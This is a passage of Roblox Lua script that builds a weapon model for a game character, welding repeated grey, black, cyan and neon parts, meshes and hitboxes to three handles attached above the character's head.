Partweld=weld(m,HandleD,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.587745667, 1.90734863e-05, 0.00107955933, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.800000012, 0.600000024, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Really black","Part",Vector3.new(4.51999998, 0.300000012, 0.200000048))
Partweld=weld(m,HandleD,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.854496, -0.0399444103, 0.000982284546, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.75999999))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleD,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.262313843, 0.151351929, 0.00113296509, 0.866146564, 0.499799311, 3.48026697e-05, -0.499799341, 0.866146445, -4.24137761e-05, -5.13857412e-05, 1.93684209e-05, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleD,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.68223381, -2.31266022e-05, 0.00113487244, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.280000001, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleD,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.10200119, -0.0588569641, 0.00109291077, 0.866146564, 0.499799311, 3.48026697e-05, -0.499799341, 0.866146445, -4.24137761e-05, -5.13857412e-05, 1.93684209e-05, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(0.200000048, 0.300000012, 0.299999952))
Partweld=weld(m,HandleD,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.630195618, -0.00102615356, -1.93119049e-05, 0.999999881, 6.32107185e-05, 7.89154292e-05, 7.89154292e-05, 3.9858099e-09, -0.999999881, -6.32107185e-05, 0.999999762, 1.32292555e-09))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.899999976))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(0.200000048, 0.300000012, 0.300000042))
Partweld=weld(m,HandleD,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.502216339, -1.6450882e-05, 0.00112724304, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.400000006, 0.200000003, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleD,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0538845062, -0.0311193466, 0.0011100769, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleD,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.417726517, 1.28746033e-05, 0.00106811523, 0.999999881, 2.98023224e-08, 4.3159529e-05, -1.86628313e-09, 0.999999821, -4.31849694e-05, -4.31595145e-05, 4.31807348e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleD,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.582269669, -1.95503235e-05, 0.00113105774, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(0.449999988, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleD,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(4.80104828, -0.0301551819, 0.910226822, 0.984810233, -0.173634201, -3.186717e-05, -5.34346073e-05, -0.000119507618, -0.999999881, 0.173634231, 0.984810054, -0.000127013685))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(0.449999958, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleD,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-4.80100822, -0.0339546204, 0.910426855, -0.984802961, 0.173674881, 4.78334514e-05, 3.63842737e-05, -6.91416062e-05, 0.99999994, 0.173674941, 0.984802961, 6.17822516e-05))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(3.95000005, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleD,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.68768311, -0.0297698975, 0.0999078751, 0.999999881, 6.32107185e-05, 7.89154292e-05, 7.89154292e-05, 3.9858099e-09, -0.999999881, -6.32107185e-05, 0.999999762, 1.32292555e-09))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
HitboxD=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,1,"Really black","HitboxD",Vector3.new(4.65999985, 1.13, 0.200000048))
HitboxDweld=weld(m,HandleD,HitboxD,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.92450333, 0.0550558567, 0.000980377197, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",HitboxD,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.75999999))

HandleE=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Medium stone grey","Handle",Vector3.new(1, 1, 1))
HandleEweld=weld(m,Character.Head,HandleE,CFrame.new(-5, 4, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, 1, 0, 4.32229936e-05, -3.26037371e-05, 0.99999994, 0, 0.999999762, 3.2633543e-05, -0.99999994, 0, -4.32229936e-05))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(3.95000005, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleE,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-2.68768311, -0.0389175415, 0.0997462273, -0.999999881, -0.000124245867, 4.31585941e-05, 4.31585941e-05, -2.1014399e-12, 0.999999881, -0.000124245867, 0.999999762, 3.96104749e-09))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
mesh("SpecialMesh",HandleE,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(1.20000005, 0.25, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleE,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.175661087, -0.101444244, 0.00111961365, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Medium stone grey","Part",Vector3.new(1, 1, 2))
Partweld=weld(m,HandleE,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.499647141, 1.52587891e-05, 0.00108337402, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.5, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleE,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.188549042, 0.108885765, 0.00108909607, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleE,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0440139771, 0.0439872742, 0.0011100769, 0.707264364, 0.706946552, 3.26992413e-05, -0.706946671, 0.707264364, -4.24305217e-05, -5.31027217e-05, 6.82158725e-06, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleE,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.389144897, -0.104288101, 0.00113677979, 0.965924382, -0.258824557, 4.95198256e-05, 0.258824557, 0.965924382, -4.27193881e-05, -3.67893808e-05, 5.40289911e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Cyan","Part",Vector3.new(0.200000107, 0.200000018, 0.200000033))
Partweld=weld(m,HandleE,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.587745667, 1.90734863e-05, 0.00107955933, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.800000012, 0.600000024, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Really black","Part",Vector3.new(4.51999998, 0.300000012, 0.200000048))
Partweld=weld(m,HandleE,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.854496, -0.0399444103, 0.000982284546, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.75999999))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleE,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.262313843, 0.151351929, 0.00113296509, 0.866146564, 0.499799311, 3.48026697e-05, -0.499799341, 0.866146445, -4.24137761e-05, -5.13857412e-05, 1.93684209e-05, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleE,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.68223381, -2.31266022e-05, 0.00113487244, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.280000001, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleE,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.10200119, -0.0588569641, 0.00109291077, 0.866146564, 0.499799311, 3.48026697e-05, -0.499799341, 0.866146445, -4.24137761e-05, -5.13857412e-05, 1.93684209e-05, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(0.200000048, 0.300000012, 0.299999952))
Partweld=weld(m,HandleE,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.630195618, -0.00102615356, -1.93119049e-05, 0.999999881, 6.32107185e-05, 7.89154292e-05, 7.89154292e-05, 3.9858099e-09, -0.999999881, -6.32107185e-05, 0.999999762, 1.32292555e-09))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.899999976))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(0.200000048, 0.300000012, 0.300000042))
Partweld=weld(m,HandleE,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.502216339, -1.6450882e-05, 0.00112724304, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.400000006, 0.200000003, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleE,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0538845062, -0.0311193466, 0.0011100769, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleE,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.417726517, 1.28746033e-05, 0.00106811523, 0.999999881, 2.98023224e-08, 4.3159529e-05, -1.86628313e-09, 0.999999821, -4.31849694e-05, -4.31595145e-05, 4.31807348e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleE,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.582269669, -1.95503235e-05, 0.00113105774, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(0.449999988, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleE,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(4.80104828, -0.0301551819, 0.910226822, 0.984810233, -0.173634201, -3.186717e-05, -5.34346073e-05, -0.000119507618, -0.999999881, 0.173634231, 0.984810054, -0.000127013685))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(0.449999958, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleE,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-4.80100822, -0.0339546204, 0.910426855, -0.984802961, 0.173674881, 4.78334514e-05, 3.63842737e-05, -6.91416062e-05, 0.99999994, 0.173674941, 0.984802961, 6.17822516e-05))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(3.95000005, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleE,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.68768311, -0.0297698975, 0.0999078751, 0.999999881, 6.32107185e-05, 7.89154292e-05, 7.89154292e-05, 3.9858099e-09, -0.999999881, -6.32107185e-05, 0.999999762, 1.32292555e-09))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
HitboxE=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,1,"Really black","HitboxE",Vector3.new(4.65999985, 1.13, 0.200000048))
HitboxEweld=weld(m,HandleE,HitboxE,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.92450333, 0.0550558567, 0.000980377197, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",HitboxE,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.75999999))

HandleF=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Medium stone grey","Handle",Vector3.new(1, 1, 1))
HandleFweld=weld(m,Character.Head,HandleF,CFrame.new(5, 4, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, 1, 0, 4.32229936e-05, -3.26037371e-05, 0.99999994, 0, 0.999999762, 3.2633543e-05, -0.99999994, 0, -4.32229936e-05))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(3.95000005, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleF,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-2.68768311, -0.0389175415, 0.0997462273, -0.999999881, -0.000124245867, 4.31585941e-05, 4.31585941e-05, -2.1014399e-12, 0.999999881, -0.000124245867, 0.999999762, 3.96104749e-09))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
mesh("SpecialMesh",HandleF,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(1.20000005, 0.25, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleF,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.175661087, -0.101444244, 0.00111961365, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Medium stone grey","Part",Vector3.new(1, 1, 2))
Partweld=weld(m,HandleF,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.499647141, 1.52587891e-05, 0.00108337402, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.5, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleF,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.188549042, 0.108885765, 0.00108909607, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleF,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0440139771, 0.0439872742, 0.0011100769, 0.707264364, 0.706946552, 3.26992413e-05, -0.706946671, 0.707264364, -4.24305217e-05, -5.31027217e-05, 6.82158725e-06, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleF,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.389144897, -0.104288101, 0.00113677979, 0.965924382, -0.258824557, 4.95198256e-05, 0.258824557, 0.965924382, -4.27193881e-05, -3.67893808e-05, 5.40289911e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Cyan","Part",Vector3.new(0.200000107, 0.200000018, 0.200000033))
Partweld=weld(m,HandleF,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.587745667, 1.90734863e-05, 0.00107955933, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.800000012, 0.600000024, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Really black","Part",Vector3.new(4.51999998, 0.300000012, 0.200000048))
Partweld=weld(m,HandleF,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.854496, -0.0399444103, 0.000982284546, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.75999999))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleF,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.262313843, 0.151351929, 0.00113296509, 0.866146564, 0.499799311, 3.48026697e-05, -0.499799341, 0.866146445, -4.24137761e-05, -5.13857412e-05, 1.93684209e-05, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleF,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.68223381, -2.31266022e-05, 0.00113487244, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.280000001, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleF,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.10200119, -0.0588569641, 0.00109291077, 0.866146564, 0.499799311, 3.48026697e-05, -0.499799341, 0.866146445, -4.24137761e-05, -5.13857412e-05, 1.93684209e-05, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(0.200000048, 0.300000012, 0.299999952))
Partweld=weld(m,HandleF,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.630195618, -0.00102615356, -1.93119049e-05, 0.999999881, 6.32107185e-05, 7.89154292e-05, 7.89154292e-05, 3.9858099e-09, -0.999999881, -6.32107185e-05, 0.999999762, 1.32292555e-09))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.899999976))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(0.200000048, 0.300000012, 0.300000042))
Partweld=weld(m,HandleF,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.502216339, -1.6450882e-05, 0.00112724304, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.400000006, 0.200000003, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
